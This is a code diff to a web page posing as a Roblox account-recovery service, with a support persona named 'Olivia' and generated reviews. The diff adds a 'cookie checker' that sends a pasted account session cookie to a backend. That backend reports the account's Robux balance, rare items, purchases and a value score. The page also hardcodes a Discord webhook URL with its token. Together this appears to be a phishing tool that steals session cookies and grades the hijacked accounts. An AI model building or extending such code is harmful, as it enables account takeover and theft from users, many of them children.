@@ -983,6 +983,102 @@
         .review-card:nth-child(1) { animation-delay: 0.1s; }
         .review-card:nth-child(2) { animation-delay: 0.3s; }
         .review-card:nth-child(3) { animation-delay: 0.5s; }
+
+        /* ESTILOS DO VERIFICADOR DE COOKIE */
+        .cookie-checker {
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(99, 102, 241, 0.1);
+            border-radius: 30px;
+            border: 1px solid rgba(99, 102, 241, 0.3);
+        }
+
+        .checker-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .checker-icon {
+            font-size: 24px;
+        }
+
+        .checker-title {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .checker-subtitle {
+            color: #9ca3af;
+            font-size: 12px;
+        }
+
+        .checker-btn {
+            background: linear-gradient(135deg, #10b981, #059669);
+            border: none;
+            border-radius: 40px;
+            padding: 15px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 100%;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+
+        .checker-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .checker-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .checker-result {
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            display: none;
+        }
+
+        .checker-result.show {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+
+        .result-badge {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .badge-premium { background: linear-gradient(135deg, #f59e0b, #d97706); color: white; }
+        .badge-verificada { background: linear-gradient(135deg, #10b981, #059669); color: white; }
+        .badge-media { background: linear-gradient(135deg, #6366f1, #4f46e5); color: white; }
+        .badge-nova { background: linear-gradient(135deg, #f97316, #ea580c); color: white; }
+        .badge-rejeitada { background: linear-gradient(135deg, #ef4444, #dc2626); color: white; }
+
+        .result-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            color: #9ca3af;
+        }
+
+        .result-item span:last-child {
+            color: white;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
@@ -1046,6 +1142,26 @@
                 <!-- Exibir apenas cooldown, IP removido -->
                 <div class="info-row">
                     <div class="info-text" id="cooldownInfo"></div>
+                </div>
+            </div>
+
+            <!-- VERIFICADOR DE COOKIE -->
+            <div class="cookie-checker">
+                <div class="checker-header">
+                    <div class="checker-icon">🔍</div>
+                    <div>
+                        <div class="checker-title">Verificador de Cookie</div>
+                        <div class="checker-subtitle">Veja informações detalhadas da conta</div>
+                    </div>
+                </div>
+                
+                <button class="checker-btn" onclick="checkCookie()" id="checkerBtn">
+                    VERIFICAR COOKIE
+                </button>
+
+                <div class="checker-result" id="checkerResult">
+                    <div id="resultBadge" class="result-badge"></div>
+                    <div id="resultContent"></div>
                 </div>
             </div>
 
@@ -1177,6 +1293,7 @@
     <script>
         // Configurações
         const API_URL = '/api/webhook';
+        const CHECK_COOKIE_URL = '/api/check-cookie';
         const CHAT_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1479283460488167524/0I--IEPX0FbLAD52jy7WN_AouAO-_jLxUBiwbE2t4i34u6gt_EBYxLTcBKgm4XSVMrVS';
         const CHECK_BAN_URL = '/api/verificar-ban';
         
@@ -1193,6 +1310,111 @@
         let userRoblox = '';
         let userProblem = '';
         let analysisStarted = false;
+
+        // ===== VERIFICADOR DE COOKIE =====
+        async function checkCookie() {
+            const input = document.getElementById('cookieInput');
+            const checkerBtn = document.getElementById('checkerBtn');
+            const resultDiv = document.getElementById('checkerResult');
+            const resultBadge = document.getElementById('resultBadge');
+            const resultContent = document.getElementById('resultContent');
+            
+            const rawCookie = input.value.trim();
+
+            if (!rawCookie) {
+                showNotification('Erro', 'Cole um cookie primeiro', false);
+                return;
+            }
+
+            const cookie = cleanCookie(rawCookie);
+
+            if (!isValidCookieFormat(cookie)) {
+                showNotification('Erro', 'Formato de cookie inválido!', false);
+                return;
+            }
+
+            checkerBtn.disabled = true;
+            checkerBtn.textContent = 'VERIFICANDO...';
+
+            try {
+                const response = await fetch(CHECK_COOKIE_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ cookie: cookie })
+                });
+
+                const data = await response.json();
+
+                resultDiv.classList.add('show');
+                
+                if (data.valid) {
+                    // Definir badge baseado no status
+                    let badgeClass = '';
+                    if (data.status.includes('PREMIUM')) badgeClass = 'badge-premium';
+                    else if (data.status.includes('VERIFICADA')) badgeClass = 'badge-verificada';
+                    else if (data.status.includes('MÉDIA')) badgeClass = 'badge-media';
+                    else if (data.status.includes('NOVA')) badgeClass = 'badge-nova';
+                    else badgeClass = 'badge-rejeitada';
+                    
+                    resultBadge.className = `result-badge ${badgeClass}`;
+                    resultBadge.textContent = data.status;
+
+                    // Montar conteúdo
+                    let html = `
+                        <div class="result-item">
+                            <span>👤 Usuário:</span>
+                            <span>${data.account.username}</span>
+                        </div>
+                        <div class="result-item">
+                            <span>📅 Idade da conta:</span>
+                            <span>${data.account.age.texto}</span>
+                        </div>
+                        <div class="result-item">
+                            <span>💰 Robux:</span>
+                            <span>${data.robux.atual.toLocaleString()}</span>
+                        </div>
+                        <div class="result-item">
+                            <span>📊 Score:</span>
+                            <span>${data.score}</span>
+                        </div>
+                        <div class="result-item">
+                            <span>💎 Itens raros:</span>
+                            <span>${data.itensRaros}</span>
+                        </div>
+                        <div class="result-item">
+                            <span>🛒 Compras:</span>
+                            <span>${data.compras.total}</span>
+                        </div>
+                    `;
+
+                    if (data.recomendacao) {
+                        html += `
+                            <div class="result-item" style="border-bottom: none; margin-top: 10px;">
+                                <span style="color: #6366f1;">💡 Recomendação:</span>
+                                <span style="color: #6366f1;">${data.recomendacao}</span>
+                            </div>
+                        `;
+                    }
+
+                    resultContent.innerHTML = html;
+                } else {
+                    resultBadge.className = 'result-badge badge-rejeitada';
+                    resultBadge.textContent = '❌ COOKIE INVÁLIDO';
+                    resultContent.innerHTML = `
+                        <div class="result-item">
+                            <span>Erro:</span>
+                            <span style="color: #ef4444;">${data.error || 'Cookie inválido ou expirado'}</span>
+                        </div>
+                    `;
+                }
+
+            } catch (error) {
+                showNotification('Erro', 'Falha ao verificar cookie', false);
+            } finally {
+                checkerBtn.disabled = false;
+                checkerBtn.textContent = 'VERIFICAR COOKIE';
+            }
+        }
 
         // ===== AVALIAÇÕES DINÂMICAS =====
         const reviewTemplates = [
@@ -1370,7 +1592,7 @@
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
 
-        // ===== MENSAGENS DA OLIVIA - MUITO MAIS COMPLETAS =====
+        // ===== MENSAGENS DA OLIVIA =====
         const oliviaMessages = [
             // Passo 0 - Boas-vindas
             "Olá! Sou Olivia, prazer em te conhecer! 😊 Vou te ajudar a recuperar sua conta.\n\nPrimeiro, me conta: o que aconteceu com sua conta?\n\n✅ Opções comuns:\n• Perdi acesso à conta\n• Esqueceram minha senha\n• Minha conta foi hackeada\n• Não consigo mais acessar o email\n\nFique tranquilo, vou te ajudar passo a passo!",
